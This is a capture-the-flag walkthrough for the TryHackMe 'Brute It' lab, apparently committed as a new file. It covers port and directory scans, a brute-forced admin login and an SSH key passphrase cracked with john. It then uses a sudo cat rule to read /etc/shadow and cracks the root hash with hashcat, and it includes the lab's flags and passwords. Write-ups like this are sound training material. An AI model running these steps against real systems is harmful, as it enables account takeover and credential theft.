@@ -1,0 +1,150 @@
+Today we have another easy challenge from TryHackMe which is Linux base machine named bruteit
+
+
+Starting with Main IP :: 10.48.143.33
+
+Will start with all port scan
+
+Nmap scan report for ip-10-48-133-19.ap-south-1.compute.internal (10.48.133.19)
+Host is up (0.00028s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+So we have this let's perform service and version scan
+
+Nmap scan report for ip-10-48-133-19.ap-south-1.compute.internal (10.48.133.19)
+Host is up, received echo-reply ttl 64 (0.00031s latency).
+Scanned at 2026-05-26 06:14:54 UTC for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
+|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
+|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: HEAD GET POST OPTIONS
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Let's start enumerating the ubuntu based server web-server
+
+ gobuster dir -u http://10.48.133.19/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt 
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.48.133.19/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 312] [--> http://10.48.133.19/admin/]
+/server-status        (Status: 403) [Size: 277]
+
+
+we got this moving with this directory
+
+and with burp intruder we got admin password is admin:xavier
+
+THM{brut3_f0rce_is_e4sy}
+
+we get the web flag now we have to crack the RSA key
+
+ssh2john id_rsa > hash
+root@ip-10-48-107-149:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])
+Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+rockinroll       (id_rsa)     
+1g 0:00:00:00 DONE (2026-05-26 06:21) 12.50g/s 907600p/s 907600c/s 907600C/s rubicon..rock14
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+root@ip-10-48-107-149:~# 
+
+
+we get this also now giving perms to id_rsa file with passphrase we can log into the ssh.
+
+john@bruteit:~$ ls
+user.txt
+john@bruteit:~$ cat user.txt 
+THM{a_password_is_not_a_barrier}
+
+we have it moving further with this.
+
+PRIVILEGE ESCALATION
+
+john@bruteit:~$ sudo -l
+Matching Defaults entries for john on bruteit:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat
+ sudo /bin/cat /root/root.txt
+THM{pr1v1l3g3_3sc4l4t10n}
+
+ sudo /bin/cat /etc/shadow
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+
+49:~# nano hash.txt
+root@ip-10-48-107-149:~# hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-haswell-AMD EPYC 7571, 1410/2884 MB (512 MB allocatable), 2MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+* Uses-64-Bit
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
+
+Host memory required for this attack: 0 MB
+
+
+
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => FinishDictionary cache building /usr/share/wordlists/rockyou.txt: 3355Dictionary cache building /usr/share/wordlists/rockyou.txt: 6710Dictionary cache building /usr/share/wordlists/rockyou.txt: 1006Dictionary cache built:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 3 secs
+
+$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:football
+
+and hence we can be root this way and have the root flag too.
